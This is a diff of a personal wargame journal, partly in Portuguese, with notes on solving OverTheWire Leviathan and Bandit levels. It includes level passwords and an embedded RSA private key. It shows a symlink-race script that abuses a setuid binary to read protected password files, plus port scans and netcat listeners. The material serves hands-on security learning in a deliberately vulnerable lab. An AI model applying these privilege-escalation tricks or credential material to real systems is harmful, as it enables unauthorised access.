@@ -4,9 +4,11 @@ Current project: [[https://github.com/rafaelbeirigo/odin-css-exercises/][Web Dev
 
 * [2025-10-13 Mon]
 
-Some [[https://overthewire.org/wargames/leviathan/][bit scrubbing]] today!
+Some [[https://overthewire.org/][bit scrubbing]] (these last days) and today!
 
-** Intro
+** Leviathan
+
+*** Intro
 
 #+begin_quote
 Leviathan’s levels are called leviathan0, leviathan1, … etc. and can be accessed on
@@ -21,9 +23,9 @@ Password: leviathan0
 Data for the levels can be found in the homedirectories. You can look at /etc/leviathan_pass for the various level passwords.
 #+end_quote
 
-** Functions
+*** Functions
 
-*** Automatically assemble SSH command from given user and password (C-. C-.)
+**** Automatically assemble SSH command from given user and password (C-. C-.)
 
 #+begin_src elisp :results none
 (defun hack-ctf-overthewire-dot-org-leviathan-ssh-command
@@ -57,7 +59,7 @@ established the old way."
                   'hack-ctf-overthewire-dot-org-leviathan-ssh-command)
 #+end_src
 
-** 0 (I /have/ the password for leviathan0 and /want/ the one for leviathan1)
+*** 0 (I /have/ the password for leviathan0 and /want/ the one for leviathan1)
 leviathan0
 
 #+begin_example
@@ -68,7 +70,7 @@ leviathan0@leviathan:~/.backup$ cat bookmarks.html
 <DT><A HREF="http://leviathan.labs.overthewire.org/passwordus.html | This will be fixed later, the password for leviathan1 is 3QJ3TgzHDq" ADD_DATE="1155384634" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">password to leviathan1</A>
 #+end_example
 
-** 1
+*** 1
 
 3QJ3TgzHDq
 
@@ -164,13 +166,13 @@ $ id
 uid=12002(leviathan2) gid=12001(leviathan1) groups=12001(leviathan1)
 #+end_example
 
-** 2
+*** 2
 
 NsN1HwFoyN
 
-*** Poke
+**** Poke
 
-**** Successful execution
+***** Successful execution
 
 #+begin_example
 leviathan2@leviathan:~$ ltrace ./printfile .profile 
@@ -213,7 +215,7 @@ fi
 +++ exited (status 0) +++
 #+end_example
 
-**** Order of tests and calls
+***** Order of tests and calls
 
 Previous one:
 
@@ -236,14 +238,14 @@ setreuid(12002, 12002)                                                          
 system("/bin/cat .profile"# ~/.profile: executed by the command interpreter for login shells.
 #+end_example
 
-*** DONE Does it print the password file without tracing?  No
+**** DONE Does it print the password file without tracing?  No
 
 #+begin_example
 leviathan2@leviathan:~$ ./printfile /etc/leviathan_pass/leviathan3 
 You cant have that file...
 #+end_example
 
-*** DONE Does it get ~cat~ from PATH?  No
+**** DONE Does it get ~cat~ from PATH?  No
 
 #+begin_example
 leviathan2@leviathan:~$ export PATH=""
@@ -276,7 +278,7 @@ if [ -d "$HOME/.local/bin" ] ; then
     PATH="$HOME/.local/bin:$PATH"
 fi
 #+end_example
-*** DONE Printar link mutante.  SOLVED
+**** DONE Printar link mutante.  SOLVED
 #+begin_example
 #!/bin/bash
 
@@ -308,11 +310,11 @@ ln -sf /etc/leviathan_pass/leviathan3 /tmp/chaves-L
 leviathan2@leviathan:~$ /tmp/chaves.sh
 leviathan2@leviathan:~$ f0n8h2iWLP
 #+end_example
-*** ChatGPT comments
+**** ChatGPT comments
 
 [[https://chatgpt.com/share/68ed9138-3f28-8006-ac1e-835908865878][ChatGPT]]
 
-**** More robust TOCTOU script
+***** More robust TOCTOU script
 
 #+begin_example
 #!/bin/bash
@@ -348,7 +350,7 @@ f0n8h2iWLP
 target exited with 0
 #+end_example
 
-**** Correct program design (how this should be prevented)
+***** Correct program design (how this should be prevented)
 
 A secure program that needs to both check a user’s rights and open/use a file under another UID must avoid TOCTOU by not using separate pathname checks. Secure patterns include:
 
@@ -372,13 +374,1693 @@ Use kernel-level protections if available: openat2() with RESOLVE_NO_SYMLINKS (n
 
 In short: do the check and the use on the same resolved kernel object (the same FD), and do not re-resolve the pathname.
 
-** 3
+*** 3
 
 f0n8h2iWLP
 
-** Seinfeld Checkmark
+*** Seinfeld Checkmark
 
 [[file:images/2025-10-13_seinfeld.jpeg]]
+
+** Bandit
+
+*** 0
+ZjLjTmM6FvvyRnrb2rfNWOZOTa6ip5If
+
+*** 1
+263JGJPfgU6LtdEvgfWU1XP5yac29mFx
+
+*** 2
+MNk8KNH3Usiio41PRUEoDFPqfxLPlSmx
+
+*** 3
+2WmrDFRmJIq3IPxneAaMGhap0pFhF3NJ
+
+*** 4
+4oQYVPkxZOOEOO5pTW81FB8j8lxXGUQw
+
+*** 5
+Preciso achar um arquivo:
+- human-readable
+- 1033 bytes in size
+- not executable
+
+
+Será que o comando ~find~ dá isso?
+
+#+begin_src bash
+find . -type f -size 1033c -exec cat {} +
+#+end_src
+
+HWasnPhtq9AVKe0dmk45nxy20cvUa6EG
+
+*** 6
+
+file that:
+
+    - owned by user bandit7
+    - owned by group bandit6
+    - 33 bytes in size
+
+#+begin_src shell
+find / 2>/dev/null -user bandit7 -group bandit6 -size 33c -exec cat {} \;
+#+end_src
+
+morbNTDkSW6jIlUc0ymOdMaLnOlFVAaj
+
+*** 7
+
+dfwvzFQi4mU0wfNbFOe9RoWskMLg7eEc
+
+*** 8
+4CKMh1JI91bUIZZPXDqGanal4xvAg0JM
+
+*** 9
+
+~strings data.txt~
+
+FGUW5ilLVJrxX9kMYMmlN4MgbpfMiqey
+
+*** 10
+
+Nesse tem uma string codificada em base64.
+
+#+begin_src shell
+base64 -d data.txt
+#+end_src
+
+dtR173fZKb0RRsDFSGsg2RWnpNVj3qRr
+
+*** 11
+
+Nesse rotacionaram as letras em 13 posições.
+
+Essa é uma cifra conhecida já, a tal da ROT13.
+26 letras no falnalabeto: f == f^{-1}.
+ROT13 é sua própria inversa.
+
+#+begin_src shell
+tr 'A-Za-z' 'N-ZA-Mn-za-m' < data.txt
+#+end_src
+
+7x16WNeHIi5YkIhWsfFIqoognUTyj9Q4
+
+*** 12
+
+Agora brotou um hexdump em plain text.
+They tell it's a file that was compressed multiple times.
+
+I need to get the file that generated that hexdump.
+This can be done with:
+
+#+begin_src shell
+xxd -r data.txt
+#+end_src
+
+Aí foi uma cascata de uncompressing in several formats (bz2, gz, tar).
+
+FO5dwFsc0cbaIiH0h8J2eUks2vdTDwAn
+
+*** 13
+
+#+begin_quote
+The password for the next level is stored in /etc/bandit_pass/bandit14 and can only be read by user bandit14.
+
+For this level, you don’t get the next password, but you get a private SSH key that can be used to log into the next level.
+
+Note: localhost is a hostname that refers to the machine you are working on
+#+end_quote
+
+1. I copied the contents of the bandit14's private key that was in the home directory.
+2. Then I renamed it to ~id_rsa~.
+3. Then
+
+#+begin_src shell
+ssh bandit.labs.overthewire.org -p 2220 -i ~/.ssh/id_rsa_overthewire.org-bandit14-private-key -l bandit14
+#+end_src
+
+*** 14
+
+#+begin_quote
+The password for the next level can be retrieved by submitting the password of the current level to port 30000 on localhost.
+#+end_quote
+
+I got the pass from the folder mentioned in the previous Bandit:
+MU4VWeTyJk8ROof1qqmcBPaLh7lDCPvS
+
+I want to send that string (those bytes) to localhost on port 30000.
+
+After readin man telnet.
+
+#+begin_src shell
+telnet localhost 30000
+#+end_src
+
+This opens a connection, and I can input text.
+I typed the password, ENTER, and voilà:
+
+8xCjnmgoKbGLhHFAZlGE5Tmu4M2tKJQo
+
+*** 15
+
+#+begin_quote
+The password for the next level can be retrieved by submitting the password of the current level to port 30001 on localhost using SSL/TLS encryption.
+#+end_quote
+
+I connected to the server/port using ~openssl~.
+It's the same procedure as the telnet, but Secure®.
+
+#+begin_src shell
+openssl s_client -crlf -connect localhost:30001
+#+end_src
+
+kSkvUpMQ7lBYyCM4GBPvCvT1BfWRy0Dx
+
+*** 16
+
+#+begin_quote
+The credentials for the next level can be retrieved by submitting the password of the current level to a port on localhost in the range 31000 to 32000.
+First find out which of these ports have a server listening on them.
+Then find out which of those speak SSL/TLS and which don’t.
+There is only 1 server that will give the next credentials, the others will simply send back to you whatever you send to it.
+#+end_quote
+
+#+begin_example
+bandit16@bandit:~$ nmap -p 31000-32000 localhost
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-10-11 00:02 UTC
+Nmap scan report for localhost (127.0.0.1)
+Host is up (0.00010s latency).
+Not shown: 996 closed tcp ports (conn-refused)
+PORT      STATE SERVICE
+31046/tcp open  unknown
+31518/tcp open  unknown
+31691/tcp open  unknown
+31790/tcp open  unknown
+31960/tcp open  unknown
+#+end_example
+
+#+begin_src shell
+for p in 31046 31518 31691 31790 31960; do openssl s_client -crlf -connect localhost:$p; done;
+#+end_src
+
+Testing connection:
+
+| 31046 | Secure  Renegotiation  IS  NOT  supported |
+| 31518 |                                           |
+| 31691 |                                           |
+| 31790 |                                           |
+| 31960 |                                           |
+
+I was having a problem:
+
+#+begin_example
+    Extended master secret: no
+    Max Early Data: 0
+---
+read R BLOCK
+kSkvUpMQ7lBYyCM4GBPvCvT1BfWRy0Dx    <---- sent the current passwor
+KEYUPDATE                           <---- received this message
+#+end_example
+
+This happened because the sent data started with a *k*, that has a meaning in the /interactive/ session.
+
+[[https://stackoverflow.com/a/58574851][This answer on Stackoverflow]] suggests to avoid using the interactive session with ~ign_eof~:
+
+#+begin_src shell
+for p in 31046 31518 31691 31790 31960; do openssl s_client -ign_eof -crlf -connect localhost:$p; done;
+#+end_src
+
+The correct one was:
+
+#+begin_src shell
+openssl s_client -ign_eof -crlf -connect localhost:31790
+#+end_src
+
+Got a private key :)
+
+#+begin_src id_rsa :tangle ~/.ssh/id_rsa_overthewire.org-bandit17
+-----BEGIN RSA PRIVATE KEY-----
+MIIEogIBAAKCAQEAvmOkuifmMg6HL2YPIOjon6iWfbp7c3jx34YkYWqUH57SUdyJ
+imZzeyGC0gtZPGujUSxiJSWI/oTqexh+cAMTSMlOJf7+BrJObArnxd9Y7YT2bRPQ
+Ja6Lzb558YW3FZl87ORiO+rW4LCDCNd2lUvLE/GL2GWyuKN0K5iCd5TbtJzEkQTu
+DSt2mcNn4rhAL+JFr56o4T6z8WWAW18BR6yGrMq7Q/kALHYW3OekePQAzL0VUYbW
+JGTi65CxbCnzc/w4+mqQyvmzpWtMAzJTzAzQxNbkR2MBGySxDLrjg0LWN6sK7wNX
+x0YVztz/zbIkPjfkU1jHS+9EbVNj+D1XFOJuaQIDAQABAoIBABagpxpM1aoLWfvD
+KHcj10nqcoBc4oE11aFYQwik7xfW+24pRNuDE6SFthOar69jp5RlLwD1NhPx3iBl
+J9nOM8OJ0VToum43UOS8YxF8WwhXriYGnc1sskbwpXOUDc9uX4+UESzH22P29ovd
+d8WErY0gPxun8pbJLmxkAtWNhpMvfe0050vk9TL5wqbu9AlbssgTcCXkMQnPw9nC
+YNN6DDP2lbcBrvgT9YCNL6C+ZKufD52yOQ9qOkwFTEQpjtF4uNtJom+asvlpmS8A
+vLY9r60wYSvmZhNqBUrj7lyCtXMIu1kkd4w7F77k+DjHoAXyxcUp1DGL51sOmama
++TOWWgECgYEA8JtPxP0GRJ+IQkX262jM3dEIkza8ky5moIwUqYdsx0NxHgRRhORT
+8c8hAuRBb2G82so8vUHk/fur85OEfc9TncnCY2crpoqsghifKLxrLgtT+qDpfZnx
+SatLdt8GfQ85yA7hnWWJ2MxF3NaeSDm75Lsm+tBbAiyc9P2jGRNtMSkCgYEAypHd
+HCctNi/FwjulhttFx/rHYKhLidZDFYeiE/v45bN4yFm8x7R/b0iE7KaszX+Exdvt
+SghaTdcG0Knyw1bpJVyusavPzpaJMjdJ6tcFhVAbAjm7enCIvGCSx+X3l5SiWg0A
+R57hJglezIiVjv3aGwHwvlZvtszK6zV6oXFAu0ECgYAbjo46T4hyP5tJi93V5HDi
+Ttiek7xRVxUl+iU7rWkGAXFpMLFteQEsRr7PJ/lemmEY5eTDAFMLy9FL2m9oQWCg
+R8VdwSk8r9FGLS+9aKcV5PI/WEKlwgXinB3OhYimtiG2Cg5JCqIZFHxD6MjEGOiu
+L8ktHMPvodBwNsSBULpG0QKBgBAplTfC1HOnWiMGOU3KPwYWt0O6CdTkmJOmL8Ni
+blh9elyZ9FsGxsgtRBXRsqXuz7wtsQAgLHxbdLq/ZJQ7YfzOKU4ZxEnabvXnvWkU
+YOdjHdSOoKvDQNWu6ucyLRAWFuISeXw9a/9p7ftpxm0TSgyvmfLF2MIAEwyzRqaM
+77pBAoGAMmjmIJdjp+Ez8duyn3ieo36yrttF5NSsJLAbxFpdlc1gvtGCWW+9Cq0b
+dxviW8+TFVEBl1O4f7HVm6EpTscdDxU+bCXWkfjuRb7Dy9GOtt9JPsX8MBTakzh3
+vBgsyi/sN3RqRBcGU40fOoZyfAMT8s1m/uYv52O6IgeuZ/ujbjY=
+-----END RSA PRIVATE KEY-----
+#+end_src
+
+#+begin_src shell
+chmod 600 ~/.ssh/id_rsa_overthewire.org-bandit17
+#+end_src
+
+#+RESULTS:
+
+*** 17
+
+x2gLTTjFwMOhQ8oWNbMN362QKxfRqGlO
+
+Got the 'Byebye'.
+
+Checking out the next Bandit, as instructed.
+*** 18
+
+I was being automatically disconnected from the server because there was a directive in ~.bashrc~ for that:
+
+#+begin_quote
+someone has modified .bashrc to log you out when you log in with SSH.
+#+end_quote
+
+Then I found out that I can run a command via SSH, and that it may run before Bash did his stuff:
+
+#+begin_quote
+When you connect via SSH and specify a command to execute directly (e.g., ssh user@host "ls -l"), a non-interactive shell is often used, and your ~/.bashrc or ~/.profile might not be fully sourced, depending on the shell and the command.
+#+end_quote
+
+I did this (intructions told about ~readme~):
+
+#+begin_src shell
+ssh bandit.labs.overthewire.org -p 2220 -l bandit18 "cat readme"
+#+end_src
+
+cGWpMaKXVwDUNgPAVJbWYuGHVn9zl3j8
+
+**** 19
+
+A princípio fiquei confuso.
+Achei que o programa iria /modificar/ o proprietário do arquivo com a senha.
+
+Quando rodei o comando para saber o que fazer (conforme instruído), recebi a seguinte saída:
+
+#+begin_src shell
+bandit19@bandit:~$ ./bandit20-do
+Run a command as another user.
+  Example: ./bandit20-do id
+#+end_src
+
+Eu não li a primeira linha da saída e achei que tinha que descobrir o meu ~id~ numérico do user ~bandit19~, pra daí usar o comando para setar esse usuário como proprietário do arquivo com a senha.
+
+Depois eu acabei rodando o comando de novo e li a primeira linha.
+Daí rodei:
+
+#+begin_src shell
+bandit19@bandit:/etc/bandit_pass$ ~/bandit20-do cat bandit20
+#+end_src
+
+e obtive a senha:
+
+0qXahG8ZjOVMN9Ghs7iOWsCfZyXOUbYO
+
+O executável ~bandit20-do~ foi setado com o user bandit20 e o meu grupo.
+
+#+begin_src shell
+bandit19@bandit:~$ stat bandit20-do
+  File: bandit20-do
+  Size: 14884           Blocks: 32         IO Block: 4096   regular file
+Device: 259,1   Inode: 577828      Links: 1
+Access: (4750/-rwsr-x---)  Uid: (11020/bandit20)   Gid: (11019/bandit19)
+                           ^^^         ^^^^^^^^    ^^^         ^^^^^^^^
+Access: 2025-10-10 17:14:19.958793247 +0000
+Modify: 2025-08-15 13:16:01.732011756 +0000
+Change: 2025-08-15 13:16:01.734011763 +0000
+ Birth: 2025-08-15 13:16:01.731011751 +0000
+#+end_src
+
+Como eu faço parte do grupo do arquivo, eu posso executá-lo e como ele é do 20, eu posso ler o arquivo da próxima senha, que é dele.
+*** 20
+
+0qXahG8ZjOVMN9Ghs7iOWsCfZyXOUbYO
+
+#+begin_quote
+There is a setuid binary in the homedirectory that does the following:
+#+end_quote
+
+The "setuid binary" is ~suconnect~:
+
+#+begin_example
+bandit20@bandit:~$ ls -lah
+total 36K
+drwxr-xr-x   2 root     root     4.0K Aug 15 13:16 .
+drwxr-xr-x 150 root     root     4.0K Aug 15 13:18 ..
+-rw-r--r--   1 root     root      220 Mar 31  2024 .bash_logout
+-rw-r--r--   1 root     root     3.8K Aug 15 13:09 .bashrc
+-rw-r--r--   1 root     root      807 Mar 31  2024 .profile
+-rwsr-x---   1 bandit21 bandit20  16K Aug 15 13:16 suconnect
+
+bandit20@bandit:~$ stat suconnect
+  File: suconnect
+  Size: 15608           Blocks: 32         IO Block: 4096   regular file
+Device: 259,1   Inode: 577830      Links: 1
+Access: (4750/-rwsr-x---)  Uid: (11021/bandit21)   Gid: (11020/bandit20)
+Access: 2025-10-10 17:04:06.585772107 +0000
+Modify: 2025-08-15 13:16:02.922063839 +0000
+Change: 2025-08-15 13:16:02.923016449 +0000
+ Birth: 2025-08-15 13:16:02.921016442 +0000
+#+end_example
+
+#+begin_quote
+- it makes a connection to localhost on the port you specify as a commandline argument.
+- It then reads a line of text from the connection and compares it to the password in the previous level (bandit20).
+- If the password is correct, it will transmit the password for the next level (bandit21).
+#+end_quote
+
+Now, I am not sure if it
+1. /connects/ to an existing connection.
+2. /creates/ a new connection, or if it just
+
+Let us try first to connect to an existing connection.
+We get a list of the ports---the "simple" way:
+
+#+begin_example
+bandit20@bandit:~$ nmap localhost
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-10-11 16:21 UTC
+Nmap scan report for localhost (127.0.0.1)
+Host is up (0.00011s latency).
+Not shown: 993 closed tcp ports (conn-refused)
+PORT      STATE SERVICE
+22/tcp    open  ssh
+1111/tcp  open  lmsocialserver
+1840/tcp  open  netopia-vo2
+4321/tcp  open  rwhois
+8000/tcp  open  http-alt
+30000/tcp open  ndmps
+50001/tcp open  unknown
+
+Nmap done: 1 IP address (1 host up) scanned in 0.05 seconds
+#+end_example
+
+For the bandit19 user is the same:
+
+#+begin_example
+bandit19@bandit:~$ nmap localhost
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-10-11 16:18 UTC
+Nmap scan report for localhost (127.0.0.1)
+Host is up (0.00011s latency).
+Not shown: 993 closed tcp ports (conn-refused)
+PORT      STATE SERVICE
+22/tcp    open  ssh
+1111/tcp  open  lmsocialserver
+1840/tcp  open  netopia-vo2
+4321/tcp  open  rwhois
+8000/tcp  open  http-alt
+30000/tcp open  ndmps
+50001/tcp open  unknown
+
+Nmap done: 1 IP address (1 host up) scanned in 0.05 seconds
+#+end_example
+
+I tried connecting both ~suconnect~ and ~telnet~ to port 1111 (has "social" in the name); suconnect with '&'; and then send the password through telnet.
+I expect to receive an answer from suconnect, because it is in the same "chat".
+
+#+begin_src shell
+telnet 1111 &
+telnet 1111
+Hello, there!
+#+end_src
+
+I didn't get the message to be echoed on the screen, as I expected.
+It says something like "job /stopped/"; I wonder if I need to keep it running in the background.
+
+Let's try a different port: 30000.
+
+#+begin_src shell
+bandit20@bandit:~$ ./suconnect 30000 &
+[1] 69995
+bandit20@bandit:~$ telnet localhost 30000
+Trying 127.0.0.1...
+Connected to localhost.
+Escape character is '^]'.
+0qXahG8ZjOVMN9Ghs7iOWsCfZyXOUbYO
+Wrong! Please enter the correct current password.
+Connection closed by foreign host.
+#+end_src
+
+I believe this is the same guy from a previous Bandit.
+Let's test it.
+That Bandit is 14.
+Let's re-run it:
+
+#+begin_src shell
+bandit20@bandit:~$ telnet localhost 30000
+Trying 127.0.0.1...
+Connected to localhost.
+Escape character is '^]'.
+MU4VWeTyJk8ROof1qqmcBPaLh7lDCPvS
+Correct!
+8xCjnmgoKbGLhHFAZlGE5Tmu4M2tKJQo
+
+Connection closed by foreign host.
+#+end_src
+
+Yep!
+It is the same, and it works for the user bandit20 too.
+
+Apparently, two processes cannot listen to the same port (usually).
+I'll try running suconnect as a daemon, and telnet as a Client.
+I need a port.
+
+These are all the ports available:
+
+|          | bandit20@bandit:~$ nmap -p 0-65535 localhost                       |
+|          | Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-10-11 17:37 UTC |
+|          | Nmap scan report for localhost (127.0.0.1)                         |
+|          | Host is up (0.000097s latency).                                    |
+|          | Not shown: 65506 closed tcp ports (conn-refused)                   |
+| WORKS?   | PORT      STATE SERVICE                                            |
+|          | 22/tcp    open  ssh                                                |
+|          | 1111/tcp  open  lmsocialserver                                     |
+|          | 1840/tcp  open  netopia-vo2                                        |
+|          | 2220/tcp  open  netiq                                              |
+|          | 2221/tcp  open  rockwell-csp1                                      |
+|          | 2223/tcp  open  rockwell-csp2                                      |
+|          | 2224/tcp  open  efi-mg                                             |
+|          | 2225/tcp  open  rcip-itu                                           |
+|          | 2226/tcp  open  di-drm                                             |
+|          | 2227/tcp  open  di-msg                                             |
+|          | 2228/tcp  open  ehome-ms                                           |
+|          | 2230/tcp  open  queueadm                                           |
+|          | 2231/tcp  open  wimaxasncp                                         |
+|          | 2232/tcp  open  ivs-video                                          |
+|          | 4091/tcp  open  ewinstaller                                        |
+|          | 4258/tcp  open  vrml-multi-use                                     |
+|          | 4321/tcp  open  rwhois                                             |
+|          | 5842/tcp  open  reversion                                          |
+|          | 8000/tcp  open  http-alt                                           |
+| bandit14 | 30000/tcp open  ndmps                                              |
+| n        | 30001/tcp open  pago-services1                                     |
+| bandit25 | 30002/tcp open  pago-services2                                     |
+|          | 31046/tcp open  unknown                                            |
+|          | 31518/tcp open  unknown                                            |
+|          | 31691/tcp open  unknown                                            |
+|          | 31790/tcp open  unknown                                            |
+|          | 31960/tcp open  unknown                                            |
+|          | 50001/tcp open  unknown                                            |
+|          | 51790/tcp open  unknown                                            |
+|          | 60917/tcp open  unknown                                            |
+
+Given that bandit15 uses port 30000, and bandit25 uses port 30002, I bet the port I need for this Bandit is 30001.
+
+I tried first running succonect on the background and sending the password via nc.
+But it closes the connection.
+
+#+begin_example
+bandit20@bandit:~$ ./suconnect 30001 &
+[1] 290352
+
+bandit20@bandit:~$ nc localhost 30001
+0qXahG8ZjOVMN9Ghs7iOWsCfZyXOUbYO
+bandit20@bandit:~$                       <--- It closes the connection
+#+end_example
+
+I tried using ~screen~ to run the daemon, and another session to connect to it.
+
+I created a dedicated session for ~suconnect~:
+
+#+begin_src shell
+screen -S suconnect
+#+end_src
+
+Then I started the ~suconnect~ daemon.
+
+#+begin_src shell
+./suconnect 30001
+#+end_src
+
+Then I detached the screen session with ~C-a d~.
+
+Then I connected and sent the password using ~nc~.
+
+#+begin_src shell
+nc localhost 30001
+#+end_src
+
+I was disconnected, as expected.
+
+Then I reattached to the ~screen~ running ~suconnect~ with
+
+#+begin_src shell
+screen -x suconnect
+#+end_src
+
+I expected to see the next password as the output there, but there was no output.
+
+Future me: up until now, I had tried:
+- ~suconnect~ as the daemon
+  - using already opened ports
+
+| Daemon    | Open new port | Use existing port |
+|-----------+---------------+-------------------|
+| suconnect |               | Doesn't work      |
+| nc        |               |                   |
+
+I tried connecting with ~suconnect~ to every port in the interval 0--65535.
+It connected to some, but I couldn't tell if it was connecting to an open port or opening a new port.
+
+Then I came across [[https://stackoverflow.com/a/79726454][this answer on Stackoverflow]] that teaches hot to solve it.
+According to this answer, ~nc~ will be the daemon, and ~suconnect~ will be the client.
+The answer instructs to use the parameters ~-lnvp~ for ~nc~.
+
+I first tried to use port 30001.
+
+#+begin_example
+bandit20@bandit:~$ nc -lnvp 30001
+nc: Address already in use
+#+end_example
+
+Then I tried a port not reported by ~nmap~ above.
+
+#+begin_example
+bandit20@bandit:~$ nc -lnvp 30003
+Listening on 0.0.0.0 30003
+#+end_example
+
+Then I dettached and attached to ~suconnect~'s ~screen~.
+I started ~suconnect~ there using the same port.
+
+#+begin_src shell
+./suconnect 30003
+#+end_src
+
+No output.
+
+Back on ~nc~'s screen, I got the message of a received connection, probably from ~suconnect~.
+
+#+begin_example
+Connection received on 127.0.0.1 54356
+#+end_example
+
+I then sent the current password, and got the next one as a reply.
+
+#+begin_example
+0qXahG8ZjOVMN9Ghs7iOWsCfZyXOUbYO
+EeoULMCra2q0dSkYj561DX7s1CpBuOBt
+#+end_example
+
+Back on ~suconnect~'s ~screen~:
+
+#+begin_example
+Read: 0qXahG8ZjOVMN9Ghs7iOWsCfZyXOUbYO
+Password matches, sending next password
+#+end_example
+
+After reading this from ~man lc~:
+
+#+begin_example
+-l      Listen for an incoming connection rather than initiating a con‐
+        nection to a remote host.  The destination and port to listen on
+        can be specified either as non-optional arguments, or with op‐
+        tions -s and -p respectively.  Cannot be used together with -x or
+        -z.  Additionally, any timeouts specified with the -w option are
+        ignored.
+#+end_example
+
+I tried with just ~nc -l~, and it worked the same.
+
+I also tried still using ~nc~ as the daemon, but without any parameter.
+
+#+begin_example
+bandit20@bandit:~$ nc 30003
+nc: missing port number
+#+end_example
+
+Then with the host.
+
+#+begin_example
+bandit20@bandit:~$ nc localhost 30003
+bandit20@bandit:~$
+#+end_example
+
+Apparently it did not create a connection.
+I still tried starting ~suconnect~.
+
+#+begin_example
+bandit20@bandit:~$ ./suconnect 30003
+Could not connect
+#+end_example
+
+This shows that it needs the ~-l~ parameter.
+
+I looked at the manpage for the meaning of the ~nvp~ parameters.
+
+#+begin_example
+-n      Do not perform domain name resolution.  If a name cannot be re‐
+        solved without DNS, an error will be reported.
+#+end_example
+
+I don't see why this would affect the command, as no host was used.
+
+#+begin_example
+-v      Produce more verbose output.
+#+end_example
+
+Non-essential.
+
+#+begin_example
+-p source_port
+        Specify the source port nc should use, subject to privilege re‐
+        strictions and availability.
+#+end_example
+
+Why does it work witout specifying 30003 as a /port/ with ~p~?
+The only mandatory parameter so far is ~l~, which needs a destination and port.
+
+From the manpage:
+
+#+begin_example
+In general, a destination must be specified, unless the -l option is given (in which case the local host is used).
+#+end_example
+
+Now, the only mandatory parameter is the port, so there is no reason to make ~-p~ mandatory.
+
+EeoULMCra2q0dSkYj561DX7s1CpBuOBt
+*** 21
+
+#+begin_quote
+A program is running automatically at regular intervals from cron, the time-based job scheduler.
+Look in /etc/cron.d/ for the configuration and see what command is being executed.
+#+end_quote
+
+The files in ~/etc/cron.d/~ are:
+
+#+begin_example
+bandit21@bandit:/etc/cron.d$ ls -lah
+total 60K
+drwxr-xr-x   2 root root 4.0K Aug 15 13:19 .
+drwxr-xr-x 128 root root  12K Aug 29 21:51 ..
+-r--r-----   1 root root   47 Aug 15 13:16 behemoth4_cleanup
+-rw-r--r--   1 root root  123 Aug 15 13:09 clean_tmp
+-rw-r--r--   1 root root  120 Aug 15 13:16 cronjob_bandit22
+-rw-r--r--   1 root root  122 Aug 15 13:16 cronjob_bandit23
+-rw-r--r--   1 root root  120 Aug 15 13:16 cronjob_bandit24
+-rw-r--r--   1 root root  201 Apr  8  2024 e2scrub_all
+-r--r-----   1 root root   48 Aug 15 13:17 leviathan5_cleanup
+-rw-------   1 root root  138 Aug 15 13:17 manpage3_resetpw_job
+-rwx------   1 root root   52 Aug 15 13:19 otw-tmp-dir
+-rw-r--r--   1 root root  102 Mar 31  2024 .placeholder
+-rw-r--r--   1 root root  396 Jan  9  2024 sysstat
+#+end_example
+
+To get the file contents I used ~cat~:
+
+#+begin_example
+bandit21@bandit:/etc/cron.d$ find . -exec echo {} \; -exec cat {} \; -exec echo "" \;
+#+end_example
+
+This guy is the most suspicious one.
+
+#+begin_example
+./sysstat
+# The first element of the path is a directory where the debian-sa1
+# script is located
+PATH=/usr/lib/sysstat:/usr/sbin:/usr/sbin:/usr/bin:/sbin:/bin
+
+# Activity reports every 10 minutes everyday
+5-55/10 * * * * root command -v debian-sa1 > /dev/null && debian-sa1 1 1
+
+# Additional run at 23:59 to rotate the statistics file
+59 23 * * * root command -v debian-sa1 > /dev/null && debian-sa1 60 2
+#+end_example
+
+#+begin_quote
+# The first element of the path is a directory where the debian-sa1
+# script is located
+#+end_quote
+
+The contents of "the first element of the path", ~/usr/lib/sysstat/~, are:
+
+#+begin_example
+bandit21@bandit:/usr/lib/sysstat$ alias ls='ls -lah'
+bandit21@bandit:/usr/lib/sysstat$ ls
+total 104K
+drwxr-xr-x  2 root root 4.0K Jul 31 10:05 .
+drwxr-xr-x 86 root root 4.0K Aug 15 13:10 ..
+-rwxr-xr-x  1 root root  446 Jan  9  2024 debian-sa1
+-rwxr-xr-x  1 root root 1.8K Jan  9  2024 sa1
+-rwxr-xr-x  1 root root 1.6K Jan  9  2024 sa2
+-rwxr-xr-x  1 root root  82K Jan  9  2024 sadc
+#+end_example
+
+It didn't take anywhere interesting.
+
+After some fiddling around:
+
+#+begin_example
+bandit21@bandit:~$ cat /cat /usr/bin/cronjob_bandit22.sh
+cat: /cat: No such file or directory
+#!/bin/bash
+chmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
+cat /etc/bandit_pass/bandit22 > /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
+#+end_example
+
+The passwords are in those ~/etc/bandit_pass/banditXX~ files.
+This cron job is copying the password I need, ~bandit22~'s, to a temp file.
+To see it, I did:
+
+#+begin_example
+bandit21@bandit:~$ cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
+tRae0UfB9v0UzbCdn9cY0gQnds9GF58Q
+#+end_example
+
+and voilà:
+
+tRae0UfB9v0UzbCdn9cY0gQnds9GF58Q
+*** 22
+
+#+begin_quote
+A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.
+
+NOTE: Looking at shell scripts written by other people is a very useful skill. The script for this level is intentionally made easy to read. If you are having problems understanding what it does, try executing it to see the debug information it prints.
+#+end_quote
+
+The contents of ~/etc/cron.d/~ should be the same.
+I'll start by investigating ~bandit22~'s script.
+This is the job for the bandit:
+
+#+begin_example
+bandit22@bandit:/etc/cron.d$ cat cronjob_bandit23
+@reboot bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
+​* * * * * bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
+#+end_example
+
+and this is the contents of that script:
+
+#+begin_example
+bandit22@bandit:/etc/cron.d$ cat  /usr/bin/cronjob_bandit23.sh
+#!/bin/bash
+
+myname=$(whoami)
+mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)
+
+echo "Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget"
+
+cat /etc/bandit_pass/$myname > /tmp/$mytarget
+#+end_example
+
+It uses the username ~bandit24~ (that would be gotten from ~whoami~) to create a target filename in a somewhat sophisticated process involving ~mdsum~.
+
